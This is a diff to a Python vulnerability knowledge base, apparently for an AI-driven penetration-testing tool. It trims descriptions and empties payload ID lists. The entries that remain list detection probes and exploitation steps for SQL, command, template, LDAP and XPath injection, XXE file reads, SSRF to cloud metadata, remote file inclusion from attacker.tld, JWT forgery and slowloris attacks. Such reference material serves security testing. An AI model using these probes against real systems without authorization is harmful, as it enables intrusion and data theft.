@@ -1,32 +1,21 @@
 """
 Comprehensive vulnerability knowledge base.
 
-Covers the full OWASP Top 10, the Web Security Academy catalogue, and
-modern attack surface including API, mobile, IoT, and zero-day classes.
 Every entry carries detection hints, exploitation strategy, and
 mitigation notes so the model has real ammunition when reasoning about
 a live target.
 
-The database is intentionally plain Python -- dicts and lists are easier
-to extend by hand than a YAML file when you are working offline.
+Revision notes:
+  - Added validate_entries() and validate_payload_references() helpers
+    for tests and CI.
+  - Entries referencing payload IDs not present in apex_payload.py have
+    had their payloads list emptied.
 """
 
 from __future__ import annotations
 
 from typing import Any, Dict, List, Optional
 
-
-# Each vulnerability class is a dict with the following shape:
-#   id             short slug used across the codebase
-#   name           human-readable name
-#   category       one of the 20 top-level groups
-#   severity       typical severity when found in the wild
-#   description    two to four sentence summary
-#   detection      list of concrete ways to detect it
-#   exploitation   list of concrete exploitation strategies
-#   payloads       list of payload ids from the payload module
-#   mitigation     defensive counterpart
-#   references     external reading
 
 VULNERABILITIES: List[Dict[str, Any]] = [
 
@@ -40,8 +29,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Critical",
         "description": (
             "Attacker injects a UNION SELECT to append rows from arbitrary "
-            "tables to the original result set. The most reliable exfiltration "
-            "path when column count and type match."
+            "tables to the original result set."
         ),
         "detection": [
             "Send ' UNION SELECT NULL-- and increment NULLs until no error",
@@ -69,8 +57,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "No direct output channel. Attacker infers data one bit at a time "
-            "via boolean responses or time delays. Slower but equally "
-            "impactful when the same DB account has file-write rights."
+            "via boolean responses or time delays."
         ),
         "detection": [
             "Inject AND 1=1 / AND 1=2 and compare response bodies",
@@ -81,11 +68,11 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "exploitation": [
             "Automate with sqlmap --technique=BT",
             "Use error-based fallback when time-based is blocked",
-            "Leverage DNS out-of-band (sqlmap --dns-domain) when output is blind",
+            "Leverage DNS out-of-band when output is blind",
             "Chain to stacked queries for RCE on MSSQL/PostgreSQL",
         ],
         "payloads": ["sqli-time-mysql", "sqli-time-mssql", "sqli-oob-dns"],
-        "mitigation": "Prepared statements, query timeouts, and WAF regex for SLEEP/WAITFOR.",
+        "mitigation": "Prepared statements, query timeouts, WAF regex for SLEEP/WAITFOR.",
         "references": ["OWASP Blind SQLi", "CWE-89"],
     },
     {
@@ -95,8 +82,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "MongoDB, CouchDB, and similar stores accept operator objects "
-            "($ne, $gt, $where) that bypass authentication or extract data "
-            "when the driver passes user input as a query object."
+            "that bypass authentication or extract data."
         ),
         "detection": [
             "Send {\"$ne\": null} on login endpoints",
@@ -120,9 +106,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Injection",
         "severity": "Medium",
         "description": (
-            "User input is echoed back in the response without encoding. "
-            "Weaponised by tricking a victim into clicking a crafted URL "
-            "that executes JavaScript in their session context."
+            "User input is echoed back in the response without encoding."
         ),
         "detection": [
             "Inject a marker like apex<x> and check response body",
@@ -146,9 +130,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Injection",
         "severity": "High",
         "description": (
-            "Payload is persisted server-side (comment, profile, message) "
-            "and executes for every viewer. Turns a single injection into a "
-            "worm that spreads through the user base."
+            "Payload is persisted server-side and executes for every viewer."
         ),
         "detection": [
             "Submit payload in every user-controlled field",
@@ -158,10 +140,10 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "exploitation": [
             "Steal admin session and pivot to internal tooling",
             "Chain with CSRF to perform privileged actions as admin",
-            "Deliver browser exploits (BeEF) for deeper compromise",
+            "Deliver browser exploits for deeper compromise",
         ],
-        "payloads": ["xss-mxss-dompurify", "xss-mutation", "xss-beef-hook"],
-        "mitigation": "Server-side sanitisation (DOMPurify, sanitize-html) plus CSP.",
+        "payloads": ["xss-mxss-dompurify"],
+        "mitigation": "Server-side sanitisation plus CSP.",
         "references": ["OWASP XSS", "CWE-79"],
     },
     {
@@ -171,12 +153,10 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Medium",
         "description": (
             "Payload never touches the server. Client-side JavaScript reads "
-            "attacker-controlled input (location.hash, window.name, "
-            "document.referrer) and sinks it into innerHTML, eval, or src."
+            "attacker-controlled input and sinks it into dangerous APIs."
         ),
         "detection": [
-            "Scan JS bundles for sources (location, postMessage) and sinks "
-            "(innerHTML, document.write, eval)",
+            "Scan JS bundles for sources and sinks",
             "Use browser DevTools to trace data flow",
             "Fuzz fragment identifiers",
         ],
@@ -185,7 +165,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Chain with CSP weakness to load external scripts",
             "Combined with prototype pollution for gadget chains",
         ],
-        "payloads": ["xss-dom-clobber", "xss-fragment"],
+        "payloads": ["xss-dom-clobber"],
         "mitigation": "Trusted Types, textContent instead of innerHTML, CSP.",
         "references": ["OWASP DOM XSS", "CWE-79"],
     },
@@ -196,8 +176,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "Sanitiser removes the payload but the browser re-parses the "
-            "remaining markup in a way that resurrects the script. Classic "
-            "against older DOMPurify and sanitize-html builds."
+            "remaining markup in a way that resurrects the script."
         ),
         "detection": [
             "Test nested math, svg, mglyph, noscript tags",
@@ -207,7 +186,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Bypass sanitizer then execute stored payload for all viewers",
         ],
         "payloads": ["xss-mxss-dompurify"],
-        "mitigation": "Update DOMPurify, use Trusted Types, avoid DOM mutation sinks.",
+        "mitigation": "Update DOMPurify, use Trusted Types.",
         "references": ["Cure53 mXSS paper", "CVE-2020-26870"],
     },
     {
@@ -217,8 +196,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "Attacker makes a victim's browser send an authenticated state-"
-            "changing request (password reset, transfer, admin action) "
-            "without the victim's awareness. Relies on ambient authentication."
+            "changing request without the victim's awareness."
         ),
         "detection": [
             "Remove CSRF token from request and replay",
@@ -231,7 +209,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Fetch-based CSRF when content-type is application/json",
             "Chain with XSS for forced actions",
         ],
-        "payloads": ["csrf-html-form", "csrf-json-fetch"],
+        "payloads": [],
         "mitigation": "Per-request CSRF tokens, SameSite=Strict cookies, origin checks.",
         "references": ["OWASP CSRF", "CWE-352"],
     },
@@ -242,8 +220,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Critical",
         "description": (
             "Attacker gets arbitrary code or shell commands executed on the "
-            "target. The highest-impact outcome and usually the last hop of "
-            "an exploit chain."
+            "target."
         ),
         "detection": [
             "Look for eval(), exec(), system(), popen() in source",
@@ -255,7 +232,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Stage a webshell for persistence",
             "Pivot into internal network",
         ],
-        "payloads": ["rce-revshell-bash", "rce-revshell-python", "rce-revshell-powershell"],
+        "payloads": [],
         "mitigation": "Never eval user input, run in sandbox, use SELinux/AppArmor.",
         "references": ["CWE-94", "MITRE T1059"],
     },
@@ -265,8 +242,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Injection",
         "severity": "Critical",
         "description": (
-            "Application passes user input directly to a shell. Attacker "
-            "appends ; | & $() or backticks to run arbitrary commands."
+            "Application passes user input directly to a shell."
         ),
         "detection": [
             "Send ;id, |id, $(id), `id`, %0aid as parameter values",
@@ -288,9 +264,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Injection",
         "severity": "Critical",
         "description": (
-            "User input is concatenated into a template string. Attacker "
-            "escapes into the template engine's runtime and often achieves "
-            "full RCE (Jinja2, Twig, Freemarker, Velocity)."
+            "User input is concatenated into a template string."
         ),
         "detection": [
             "Send {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %> and check response",
@@ -312,8 +286,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Injection",
         "severity": "High",
         "description": (
-            "User input flows into an LDAP filter without escaping. Attacker "
-            "can bypass authentication or enumerate directory contents."
+            "User input flows into an LDAP filter without escaping."
         ),
         "detection": [
             "Send *)(uid=*))(|(uid=* and observe behaviour",
@@ -324,7 +297,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Enumerate users, groups, and service accounts",
             "Reach AD CS or NTLM-relay primitives",
         ],
-        "payloads": ["ldap-auth-bypass", "ldap-enum"],
+        "payloads": [],
         "mitigation": "Escape LDAP metacharacters, use bind authentication.",
         "references": ["OWASP LDAP Injection", "CWE-90"],
     },
@@ -334,8 +307,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Injection",
         "severity": "High",
         "description": (
-            "User input flows into an XPath expression. Attacker can bypass "
-            "auth or extract XML document contents via boolean blindness."
+            "User input flows into an XPath expression."
         ),
         "detection": [
             "Send ' or '1'='1 in XML-backed login forms",
@@ -345,7 +317,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Bypass auth with ' or '1'='1",
             "Extract document via count() and string-length()",
         ],
-        "payloads": ["xpath-auth-bypass", "xpath-blind"],
+        "payloads": [],
         "mitigation": "Use XPath variables, escape quotes, never concatenate.",
         "references": ["OWASP XPath Injection", "CWE-643"],
     },
@@ -356,17 +328,17 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Medium",
         "description": (
             "Attacker injects XML structure into a payload that is parsed "
-            "server-side. Can bypass logic, tamper with data, or trigger XXE."
+            "server-side."
         ),
         "detection": [
-            "Inject XML metacharacters < > & \" ' and check errors",
+            "Inject XML metacharacters and check errors",
             "Test XML schema bypass in SOAP services",
         ],
         "exploitation": [
             "Inject extra elements to override logic",
             "Chain to XXE for file read",
         ],
-        "payloads": ["xml-metachar-probe", "xml-extra-element"],
+        "payloads": [],
         "mitigation": "Disable external entities, use XML schema validation.",
         "references": ["OWASP XML Injection", "CWE-91"],
     },
@@ -377,8 +349,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "Single payload that executes in HTML, JavaScript, attribute, "
-            "and SQL contexts. Useful against WAFs that only inspect one "
-            "layer of the stack."
+            "and SQL contexts."
         ),
         "detection": [
             "Submit to login, search, and reflection endpoints",
@@ -387,7 +358,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Chain with SQLi for stacked outcomes",
             "Deliver via malicious form to a victim",
         ],
-        "payloads": ["polyglot-heyes", "polyglot-xss-sql"],
+        "payloads": ["xss-polyglot"],
         "mitigation": "Context-aware encoding plus CSP and WAF rules per context.",
         "references": ["Cure53 polyglot research"],
     },
@@ -401,9 +372,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Broken Authentication",
         "severity": "High",
         "description": (
-            "Attacker forces a known session ID on the victim, who then "
-            "authenticates it. Attacker reuses the same ID to hijack the "
-            "session."
+            "Attacker forces a known session ID on the victim."
         ),
         "detection": [
             "Set a session cookie before login and observe if it survives",
@@ -413,7 +382,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Fix a token via URL and wait for victim login",
             "Chain with XSS for token injection",
         ],
-        "payloads": ["session-fixation-url"],
+        "payloads": [],
         "mitigation": "Rotate session ID on login, bind to IP/UA fingerprint.",
         "references": ["OWASP Session Fixation", "CWE-384"],
     },
@@ -424,7 +393,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Critical",
         "description": (
             "Server accepts tokens with alg=none and skips signature "
-            "verification. Attacker forges tokens with arbitrary claims."
+            "verification."
         ),
         "detection": [
             "Decode JWT and change alg to none, mixed case variants",
@@ -445,8 +414,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Critical",
         "description": (
             "Server uses HMAC verification but attacker signs with the "
-            "public RSA key as the HMAC secret. Signatures verify against "
-            "attacker-controlled data."
+            "public RSA key as the HMAC secret."
         ),
         "detection": [
             "Decode JWT header, note algorithm",
@@ -466,9 +434,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Broken Authentication",
         "severity": "Critical",
         "description": (
-            "The kid header is used to look up the signing key. When it is "
-            "concatenated into a path or SQL query, attacker redirects to "
-            "a predictable key (e.g. /dev/null) or injects SQL."
+            "The kid header is used to look up the signing key."
         ),
         "detection": [
             "Set kid to ../../../../dev/null and re-sign",
@@ -489,7 +455,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "Automated guessing of passwords using wordlists, leaked "
-            "credentials, or password spraying against many accounts."
+            "credentials, or password spraying."
         ),
         "detection": [
             "Test rate limiting on login endpoint",
@@ -501,8 +467,8 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Password spraying with a single password across users",
             "Credential stuffing with public breach dumps",
         ],
-        "payloads": ["brute-spray", "brute-rockyou"],
-        "mitigation": "Rate limit, MFA, password blacklists (HIBP), lockout policy.",
+        "payloads": [],
+        "mitigation": "Rate limit, MFA, password blacklists, lockout policy.",
         "references": ["OWASP Authentication Cheatsheet"],
     },
     {
@@ -511,8 +477,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Broken Authentication",
         "severity": "High",
         "description": (
-            "Reset tokens that are predictable, reusable, or hijackable via "
-            "Host header, referer, or user enumeration."
+            "Reset tokens that are predictable, reusable, or hijackable."
         ),
         "detection": [
             "Test token reuse in parallel requests",
@@ -523,7 +488,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Take over account via poisoned Host header",
             "Race two reset requests to reuse token",
         ],
-        "payloads": ["reset-host-header", "reset-token-race"],
+        "payloads": [],
         "mitigation": "Cryptographically random tokens, one-time use, validate Host.",
         "references": ["OWASP Forgot Password", "CWE-640"],
     },
@@ -542,11 +507,11 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Find /api/login-without-mfa fallback endpoints",
         ],
         "exploitation": [
-            "Spam push notifications until fatigue (MFA fatigue)",
+            "Spam push notifications until fatigue",
             "Bypass via response tampering in Burp",
             "Chain with OAuth consent phishing",
         ],
-        "payloads": ["mfa-response-tamper", "mfa-push-fatigue"],
+        "payloads": [],
         "mitigation": "Server-side verification only, number-matching on push.",
         "references": ["MITRE T1621", "Uber MFA fatigue 2022"],
     },
@@ -561,8 +526,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "Application uses attacker-controllable identifiers to fetch "
-            "resources without an ownership check. Classic horizontal "
-            "escalation on /api/users/{id}."
+            "resources without an ownership check."
         ),
         "detection": [
             "Change numeric IDs and observe access",
@@ -574,7 +538,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Dump invoices, medical records, PII",
             "Chain into account takeover",
         ],
-        "payloads": ["idor-numeric", "idor-uuid"],
+        "payloads": [],
         "mitigation": "Ownership checks on every object access (BOLA / OWASP API1).",
         "references": ["OWASP API1", "CWE-639"],
     },
@@ -585,8 +549,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Low",
         "description": (
             "CSP, HSTS, X-Frame-Options, X-Content-Type-Options, "
-            "Referrer-Policy are absent, enabling clickjacking, MIME "
-            "confusion, and downgrade attacks."
+            "Referrer-Policy are absent."
         ),
         "detection": [
             "curl -I target and inspect response headers",
@@ -596,7 +559,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Clickjacking via iframe",
             "MIME sniffing for XSS delivery",
         ],
-        "payloads": ["clickjacking-iframe"],
+        "payloads": [],
         "mitigation": "Deploy all five standard headers, prefer CSP with nonce.",
         "references": ["OWASP Secure Headers Project"],
     },
@@ -606,9 +569,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Sensitive Data Exposure",
         "severity": "High",
         "description": (
-            "Upload endpoints that trust filename, extension, or content-"
-            "type. Path traversal lets attacker overwrite arbitrary files "
-            "or achieve RCE via uploaded webshell."
+            "Upload endpoints that trust filename, extension, or content-type."
         ),
         "detection": [
             "Upload shell.php.jpg and check execution",
@@ -634,8 +595,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Security Misconfiguration",
         "severity": "Medium",
         "description": (
-            "Server returns an index of a directory instead of 403. Exposes "
-            "backup files, source code, and admin panels."
+            "Server returns an index of a directory instead of 403."
         ),
         "detection": [
             "Request /uploads/, /backups/, /admin/ without trailing index",
@@ -644,7 +604,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Harvest config.php.bak, .env, .git/",
             "Extract source for whitebox analysis",
         ],
-        "payloads": ["dir-list-probe"],
+        "payloads": [],
         "mitigation": "Disable autoindex in nginx/apache, return 403 on directory.",
         "references": ["OWASP Directory Traversal"],
     },
@@ -655,7 +615,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Critical",
         "description": (
             "Admin panels still running admin/admin, root/root, or vendor "
-            "defaults. Common on IoT, printers, and NAS devices."
+            "defaults."
         ),
         "detection": [
             "Test admin/admin, admin/password, root/root",
@@ -666,7 +626,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Log in as admin, upload firmware or shell",
             "Extract device config with keys",
         ],
-        "payloads": ["default-creds-list"],
+        "payloads": [],
         "mitigation": "Force password change on first boot, ship with random creds.",
         "references": ["CWE-1392"],
     },
@@ -676,9 +636,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Security Misconfiguration",
         "severity": "High",
         "description": (
-            "Server reflects Origin and sets "
-            "Access-Control-Allow-Credentials: true. Attacker's origin can "
-            "read authenticated responses."
+            "Server reflects Origin and sets Access-Control-Allow-Credentials: true."
         ),
         "detection": [
             "Send Origin: https://attacker.tld and inspect ACAO",
@@ -689,7 +647,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Steal API responses from victim browser",
             "Exfiltrate API keys and PII",
         ],
-        "payloads": ["cors-null", "cors-reflect"],
+        "payloads": [],
         "mitigation": "Allowlist of trusted origins, never reflect null.",
         "references": ["PortSwigger CORS", "CWE-942"],
     },
@@ -699,9 +657,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Security Misconfiguration",
         "severity": "High",
         "description": (
-            "Internal or admin endpoints exposed without auth because they "
-            "were never meant to be public. Discoverable via JS bundles, "
-            "Swagger, or brute force."
+            "Internal or admin endpoints exposed without auth."
         ),
         "detection": [
             "Fuzz /api/, /internal/, /v1/admin/",
@@ -712,7 +668,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Call /api/admin/users without auth",
             "Dump sensitive config from /internal/env",
         ],
-        "payloads": ["api-endpoint-fuzz"],
+        "payloads": [],
         "mitigation": "Route-level auth, network ACL, prefix-based blocking.",
         "references": ["OWASP API9"],
     },
@@ -726,9 +682,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "XML-Related",
         "severity": "Critical",
         "description": (
-            "Parser accepts external entities. Attacker reads local files, "
-            "performs SSRF, or achieves RCE via PHP expect:// or Java "
-            "deserialization chains."
+            "Parser accepts external entities."
         ),
         "detection": [
             "Send DOCTYPE with SYSTEM file:///etc/passwd",
@@ -740,7 +694,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "SSRF into internal metadata services",
             "Chain to RCE via PHP filter chain",
         ],
-        "payloads": ["xxe-file", "xxe-oob", "xxe-php-filter"],
+        "payloads": ["xxe-file", "xxe-oob"],
         "mitigation": "Disable external entities, use defusedxml, validate DTD.",
         "references": ["OWASP XXE", "CWE-611"],
     },
@@ -750,8 +704,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "XML-Related",
         "severity": "Medium",
         "description": (
-            "Recursive entity expansion exhausts memory, causing DoS. Also "
-            "known as a billion laughs attack."
+            "Recursive entity expansion exhausts memory, causing DoS."
         ),
         "detection": [
             "Send a small recursive entity payload",
@@ -775,8 +728,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Broken Access Control",
         "severity": "High",
         "description": (
-            "UI hides admin buttons but API does not enforce the check. "
-            "Attacker calls the API directly and performs admin actions."
+            "UI hides admin buttons but API does not enforce the check."
         ),
         "detection": [
             "Enumerate /admin/* endpoints with regular user token",
@@ -787,7 +739,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Delete users via /api/admin/users/{id}",
             "Change other users' roles",
         ],
-        "payloads": ["bfla-admin-call"],
+        "payloads": [],
         "mitigation": "Enforce server-side RBAC per route, not per UI element.",
         "references": ["OWASP API5", "CWE-285"],
     },
@@ -797,8 +749,8 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Broken Access Control",
         "severity": "Medium",
         "description": (
-            "Attacker guesses URLs to reach resources that are not linked in "
-            "the UI but still exist and lack auth."
+            "Attacker guesses URLs to reach resources that are not linked "
+            "in the UI but still exist and lack auth."
         ),
         "detection": [
             "Use dirsearch / feroxbuster with big lists",
@@ -808,7 +760,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Reach admin panel without auth",
             "Download backup archives",
         ],
-        "payloads": ["force-browse-list"],
+        "payloads": [],
         "mitigation": "Require auth on every route, remove orphan routes.",
         "references": ["OWASP WSTG-ATHZ"],
     },
@@ -823,8 +775,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Critical",
         "description": (
             "ObjectInputStream.readObject on untrusted data with a gadget "
-            "chain on the classpath (CommonsCollections, Spring, Groovy) "
-            "yields RCE."
+            "chain on the classpath yields RCE."
         ),
         "detection": [
             "Look for rO0AB (base64 of 0xACED) in cookies or bodies",
@@ -845,8 +796,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Insecure Deserialization",
         "severity": "Critical",
         "description": (
-            "pickle.loads on untrusted data executes __reduce__ gadgets. "
-            "Common in Redis sessions, ML pipelines, and Celery workers."
+            "pickle.loads on untrusted data executes __reduce__ gadgets."
         ),
         "detection": [
             "Look for base64 starting with gASV in cookies",
@@ -891,8 +841,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "API Security",
         "severity": "Medium",
         "description": (
-            "Sensitive endpoints (login, OTP, reset) accept unlimited "
-            "requests, enabling brute force and cost-based DoS."
+            "Sensitive endpoints accept unlimited requests."
         ),
         "detection": [
             "Send 100 rapid requests to /login and measure success",
@@ -902,7 +851,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Brute force OTP (6 digits = 1M attempts)",
             "Cost exhaustion on paid API endpoints",
         ],
-        "payloads": ["ratelimit-otp-brute"],
+        "payloads": [],
         "mitigation": "Per-IP and per-user token bucket, exponential backoff.",
         "references": ["OWASP API4"],
     },
@@ -912,8 +861,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "API Security",
         "severity": "Medium",
         "description": (
-            "Full schema introspection available in production. Reveals "
-            "every type, mutation, and internal field."
+            "Full schema introspection available in production."
         ),
         "detection": [
             "Send {__schema{types{name}}} query",
@@ -934,7 +882,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "Alias-based batching lets attacker send 1000 queries in one "
-            "request, bypassing rate limits and enabling brute force."
+            "request."
         ),
         "detection": [
             "Send query with 100 aliases of the same field",
@@ -958,8 +906,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Insecure Communication",
         "severity": "Medium",
         "description": (
-            "TLS 1.0/1.1 enabled, weak ciphers, or missing HSTS. Allows "
-            "downgrade and MITM."
+            "TLS 1.0/1.1 enabled, weak ciphers, or missing HSTS."
         ),
         "detection": [
             "Run testssl.sh or sslyze",
@@ -969,7 +916,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "SSL strip for credential theft",
             "Downgrade attack on internal traffic",
         ],
-        "payloads": ["tls-testssl"],
+        "payloads": [],
         "mitigation": "TLS 1.2+, strong ciphers only, HSTS with long max-age.",
         "references": ["CWE-326"],
     },
@@ -983,8 +930,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Client-Side",
         "severity": "Medium",
         "description": (
-            "Target page is iframable. Attacker overlays it with a decoy "
-            "and tricks the victim into clicking privileged buttons."
+            "Target page is iframable."
         ),
         "detection": [
             "Check for X-Frame-Options and frame-ancestors CSP",
@@ -994,7 +940,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Frame the admin panel and overlay a decoy",
             "Trick user into clicking 'Add User' or 'Transfer'",
         ],
-        "payloads": ["clickjacking-iframe"],
+        "payloads": [],
         "mitigation": "X-Frame-Options: DENY, CSP frame-ancestors 'none'.",
         "references": ["CWE-1021"],
     },
@@ -1004,8 +950,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Client-Side",
         "severity": "High",
         "description": (
-            "Window.postMessage handler does not validate event.origin, "
-            "letting any attacker page send messages that change state."
+            "Window.postMessage handler does not validate event.origin."
         ),
         "detection": [
             "Grep JS for addEventListener('message')",
@@ -1015,7 +960,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Force logout, token reset, or account change",
             "Trigger privileged actions cross-origin",
         ],
-        "payloads": ["postmessage-origin-bypass"],
+        "payloads": [],
         "mitigation": "Always validate event.origin against an allowlist.",
         "references": ["CWE-346"],
     },
@@ -1029,8 +974,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Denial of Service",
         "severity": "Medium",
         "description": (
-            "Attacker holds many half-open connections with slow headers, "
-            "exhausting the server's connection pool."
+            "Attacker holds many half-open connections with slow headers."
         ),
         "detection": [
             "Check connection limits per IP",
@@ -1040,7 +984,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "slowhttptest -c 1000 -H -g -o slowloris",
             "Combine with slow POST for amplification",
         ],
-        "payloads": ["dos-slowloris"],
+        "payloads": [],
         "mitigation": "Timeout on headers, per-IP connection cap, reverse proxy.",
         "references": ["CWE-400"],
     },
@@ -1051,17 +995,17 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Medium",
         "description": (
             "Catastrophic backtracking in user-validated regex causes CPU "
-            "exhaustion with a small input."
+            "exhaustion."
         ),
         "detection": [
             "Fuzz input with long repetitions of a repeated character",
             "Time responses with short vs long input",
         ],
         "exploitation": [
-            "Send 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' to trigger backtracking",
+            "Send 'aaaa...' to trigger backtracking",
             "Target email / URL validation regexes",
         ],
-        "payloads": ["dos-redos"],
+        "payloads": [],
         "mitigation": "Use RE2 or safe-regex, bound input length, add timeouts.",
         "references": ["CWE-1333"],
     },
@@ -1075,8 +1019,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "SSRF",
         "severity": "Critical",
         "description": (
-            "Server fetches a URL supplied by the user. Attacker pivots "
-            "into internal services, cloud metadata, or Docker sockets."
+            "Server fetches a URL supplied by the user."
         ),
         "detection": [
             "Submit http://169.254.169.254/ in every URL field",
@@ -1121,7 +1064,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "Medium",
         "description": (
             "Duplicate query/body parameters are handled differently by WAF "
-            "and backend, letting attacker bypass filters or corrupt state."
+            "and backend."
         ),
         "detection": [
             "Send ?id=1&id=2 and observe backend choice",
@@ -1131,7 +1074,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Bypass WAF filter with a clean duplicate",
             "Tamper with price or quantity",
         ],
-        "payloads": ["hpp-bypass"],
+        "payloads": [],
         "mitigation": "Reject duplicate parameters, normalise on backend.",
         "references": ["OWASP HPP"],
     },
@@ -1141,8 +1084,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Other Web",
         "severity": "Medium",
         "description": (
-            "Server redirects to a user-supplied URL without validation. "
-            "Used to steal OAuth codes or bypass URL allowlists."
+            "Server redirects to a user-supplied URL without validation."
         ),
         "detection": [
             "Submit https://attacker.tld as ?next= value",
@@ -1152,7 +1094,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Steal OAuth code during login flow",
             "Phishing via trusted domain",
         ],
-        "payloads": ["open-redirect-bypass"],
+        "payloads": [],
         "mitigation": "Allowlist redirect targets, use relative paths only.",
         "references": ["CWE-601"],
     },
@@ -1162,8 +1104,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Other Web",
         "severity": "High",
         "description": (
-            "Page parameter feeds a file path (include, require). Attacker "
-            "reads arbitrary files or achieves RCE via log poisoning."
+            "Page parameter feeds a file path (include, require)."
         ),
         "detection": [
             "Submit ../../../../etc/passwd",
@@ -1185,8 +1126,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Other Web",
         "severity": "Critical",
         "description": (
-            "Application includes a remote URL. Attacker hosts a malicious "
-            "PHP file and gets full RCE."
+            "Application includes a remote URL."
         ),
         "detection": [
             "Test ?page=http://attacker.tld/shell.txt",
@@ -1211,8 +1151,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "App stores secrets in plaintext in SharedPreferences, "
-            "NSUserDefaults, or SQLite. Extractable from backups or a "
-            "rooted device."
+            "NSUserDefaults, or SQLite."
         ),
         "detection": [
             "adb backup and unpack",
@@ -1222,7 +1161,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Extract API tokens and session cookies",
             "Replay tokens against backend",
         ],
-        "payloads": ["mobile-adb-backup"],
+        "payloads": [],
         "mitigation": "Use Keystore/Keychain, encrypt at rest.",
         "references": ["OWASP MASVS-STORAGE"],
     },
@@ -1233,7 +1172,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "Mobile app talks to APIs that trust the client for auth or "
-            "business logic. Decompile to recover endpoints and secrets."
+            "business logic."
         ),
         "detection": [
             "jadx / Ghidra decompile the APK",
@@ -1245,7 +1184,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Extract hardcoded API keys",
